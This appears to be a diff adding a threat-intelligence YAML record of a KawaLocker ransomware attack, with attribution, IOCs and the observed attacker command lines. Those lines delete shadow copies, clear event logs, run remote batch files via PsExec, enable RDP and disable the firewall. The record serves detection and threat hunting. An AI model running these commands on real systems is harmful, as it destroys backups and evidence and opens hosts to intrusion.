@@ -1,0 +1,65 @@
+description: Huntress analysts observed a KawaLocker ransomware attack involving tools
+  to disable security measures.
+attribution:
+- threat_actor: Unknown
+  APT_group: None
+  country: China (based on tooling)
+malware_families:
+- KawaLocker
+TTPs:
+  processes:
+  - cmd.exe
+  - tasklist.exe
+  - PsExec.exe
+  - vssadmin.exe
+  - wevtutil.exe
+  - ping.exe
+  - del.exe
+  - e.exe
+  commandline:
+  - C:\\Windows\\System32\\cmd.exe /c @pushd C:\\Users\\[User]\\AppData\\Local\\Temp\\7ZipSfx.000 >nul 2>&1 & CALL C:\\Users\\[User]\\AppData\\Local\\Temp\\7ZipSfx.000\\HRSword.bat
+  - tasklist.exe | find /i "security_tool_name"
+  - PsExec.exe -h @1.txt -d -c "\\[REDACTED]\\1.bat"
+  - vssadmin.exe delete shadows /all /quiet
+  - cmd.exe /c wevtutil cl security | wevtutil cl system | wevtutil cl application
+  - cmd.exe /C ping 127.0.0.1 -n 2 > nul && del /F "C:\\Users\\[User]\\Desktop\\e.exe"
+  - e.exe -d="E:\\\\"
+  powershell: []
+  scripting_engine:
+  - REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections
+    /t REG_DWORD /d 0 /f && netsh firewall set opmode disable
+  registry_keys:
+  - HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server
+  image_load: []
+  network_connections:
+  - process: advanced_port_scanner.exe
+    destination_address: Unknown
+    URL_or_hostname: Unknown
+    port: Unknown
+  file_activity:
+  - C:\\Users\\[User]\\AppData\\Local\\Temp\\7ZipSfx.000
+  - C:\\Users\\[User]\\AppData\\Local\\Temp\\7ZipSfx.000\\HRSword.bat
+  - 1.txt
+  - E:\\ volume encrypted files
+  persistence: []
+  pipes: []
+  process_relations:
+  - cmd.exe -> HRSword.bat
+  - tasklist.exe -> find command
+  - PsExec.exe -> 1.bat
+  - vssadmin.exe -> delete shadows
+  - wevtutil.exe -> clear logs
+  - ping.exe -> del e.exe
+IOCs:
+  hashes: []
+  IPs: []
+  domains:
+  - kawa4096@onionmail[.]org
+  - http://kawasa2qo7345dt7ogxmx7qmn6z2hnwaoi3h5aeosupozkddqwp6lqqd.onion
+  URLs: []
+authors:
+- Harlan Carvey
+- Lindsey O'Donnell-Welch
+reference: https://www.huntress.com/blog/kawalocker-ransomware-deployed
+date_of_publication: August 14, 2025
+file_creation_date: August 17, 2025
